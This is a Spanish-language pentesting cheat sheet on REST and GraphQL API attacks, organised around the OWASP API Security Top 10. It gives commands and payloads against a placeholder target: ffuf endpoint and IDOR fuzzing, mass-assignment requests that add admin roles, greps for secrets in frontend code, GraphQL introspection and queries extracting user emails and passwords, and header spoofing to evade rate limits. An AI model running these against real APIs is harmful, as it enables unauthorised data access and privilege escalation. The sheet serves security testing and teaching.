# Seguridad en APIs REST y GraphQL

Las APIs modernas tienen sus propios vectores de ataque especificos.

OWASP API Security Top 10: https://owasp.org/www-project-api-security/

## Reconocimiento de API

```bash
# Buscar documentacion expuesta
http://api.objetivo.com/swagger
http://api.objetivo.com/swagger-ui
http://api.objetivo.com/api-docs
http://api.objetivo.com/openapi.json
http://api.objetivo.com/graphql     -> GraphQL endpoint

# Fuzzing de endpoints
ffuf -u http://api.objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://api.objetivo.com/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

# Ver peticiones con Burp Suite mientras usas la app
# -> Proxy -> HTTP History -> filtrar por /api/
```

## IDOR (Insecure Direct Object Reference) -- API01

```bash
# Si la API devuelve datos de un objeto por su ID:
GET /api/users/1234   -> tus datos
GET /api/users/1235   -> datos de otro usuario? -> IDOR

# Automatizar con ffuf
ffuf -u http://api.objetivo.com/users/FUZZ -w numeros.txt     -H "Authorization: Bearer TU_TOKEN" -mc 200

# En Burp Suite Intruder -> cambiar el ID de forma automatica
```

## Mass Assignment -- API06

```bash
# Si la API acepta campos extra al crear/actualizar:
# Normal:
POST /api/users {"name":"Juan","email":"juan@x.com"}

# Atacar enviando campos privilegiados:
POST /api/users {"name":"Juan","email":"juan@x.com","role":"admin","is_admin":true}

# Probar campos tipicos: role, admin, is_admin, privilege, balance, credit
```

## API Key / Token en respuestas

```bash
# Buscar tokens en respuestas de la API
curl http://api.objetivo.com/config | python3 -m json.tool

# Buscar en el codigo JavaScript del frontend
grep -r "api_key\|apikey\|token\|secret\|password" *.js
```

## GraphQL -- Introspection

```bash
# Si GraphQL esta expuesto, la introspection revela todo el esquema
curl -s -X POST http://objetivo.com/graphql     -H "Content-Type: application/json"     -d '{"query":"{ __schema { types { name } } }"}'

# Herramienta: GraphQL Voyager (visualizar el esquema)
# Introspection query completa:
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}

# Extraer datos con GraphQL
{users{id username email password}}
{user(id:1){email password role}}
```

## Rate Limiting bypass

```bash
# Si hay limite de peticiones, intentar bypass:
X-Forwarded-For: 1.2.3.4    -> cambiar IP aparente
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# O con diferentes User-Agents en cada peticion
```
